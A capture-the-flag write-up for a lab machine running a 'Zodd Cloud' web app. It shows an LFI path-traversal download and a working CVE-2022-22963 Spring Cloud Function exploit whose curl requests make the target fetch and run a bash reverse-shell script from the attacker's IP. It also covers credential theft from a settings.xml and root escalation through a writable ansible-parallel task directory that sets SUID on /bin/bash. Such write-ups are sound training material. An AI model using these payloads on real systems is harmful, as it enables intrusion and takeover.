```

## Website

The website itself is described as **Zodd Cloud** which is a place to store, share and collaborate on files and folders.  
There's not much to the page itself, the registration is disabled and the login button is a dead end.  

But there's and upload button wich will take you to a page where you are able to upload files.  

# Foothold

## Exploitation

### Upload: LFI & Directory Listing

As always I let Burp run in the background and browse the page, click on everything and check what I got in Burp.  
After uploading an image I already noticed the URL which looked like a typical target for a LFI.  

URL: **/show_image?img=cat.png**

And as I thought I was able to verify it's vulnerable to LFI and even lists directories!  
But you would have to either use curl or Burp to see the results as the Webapp tries to display the response as Image.

### Inspect: spring-webapp.jar

First I downloaded the webapp which I discovered previously.  

```bash
wget http://10.129.54.43:8080/show_image?img=../../../../../../var/www/WebApp/target/spring-webapp.jar -O spring-webapp.jar
```

Let's inspect the application using [JD-GUI](http://java-decompiler.github.io/)  
First thing I did go for was to find the pom.xml which can hold juicy infos  

```xml
...
<dependency>
	<groupId>org.springframework.cloud</groupId>
	<artifactId>spring-cloud-function-web</artifactId>
	<version>3.2.2</version>
</dependency>
...
```

### RCE and Shell

Using the information gathered in the app itself I was able discover that it was affected by **CVE-2022-22963**.  
You can find more infos about it [HERE](https://spring.io/security/cve-2022-22963)

Prepared a shellscript that simply setups a connection back to my machine

```bash
#!/bin/bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.139/53 0>&1'
```

```bash
# Setup listener
pwncat-cs -lp 53
# Start http.server
python -m http.server 80
# Shell: Get rev.sh
curl -i -s -k -X 'POST'  --data-raw 'data' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget 10.10.14.139/rev.sh -O /tmp/rev.sh")' 'http://10.129.54.43:8080/functionRouter'
# Shell: Execute rev.sh
curl -i -s -k -X 'POST'  --data-raw 'data' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/rev.sh")' 'http://10.129.54.43:8080/functionRouter'
```

### From Frank to Phil

While looking around I discovered a folder called **.m2** in franks home directory. That folder contained a **settings.xml** which included credentials for the user account of phil.  

```bash
su - phil
```

### Flag

The flag is located in **/home/phil**

# Escalation

## Local Enumeration

User Phil is member of the group **staff** which could be interesting.  

```bash
id
```

```bash
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

Let's see if that group has access to something special  

```bash
find / -group staff 2>/dev/null
```

```bash
...
/opt/automation/tasks
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
...
```

Using pspy I discovered a cronjob that seems to run every 3 minutes and executes **ansible-parallel** on directory **/opt/automation/tasks**

```bash
2023/03/14 23:18:01 CMD: UID=0    PID=5684   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml 
```

## Exploitation

Ansible Parallel is used to run multiple playbooks on the same time. So I guessed that the cronjob is doing something like

```bash
/usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/*
```

Easiest way to abuse that can be seen on [gtfobins](https://gtfobins.github.io/gtfobins/ansible-playbook/)

```bash
echo '[{hosts: localhost, tasks: [shell: /usr/bin/chmod +s /bin/bash]}]' >> /opt/automation/tasks/escalate.yml
```

Wait for three minutes and you should see something like this

```bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

## Root

```bash
bash -p
```

The flag is then located in **/root**
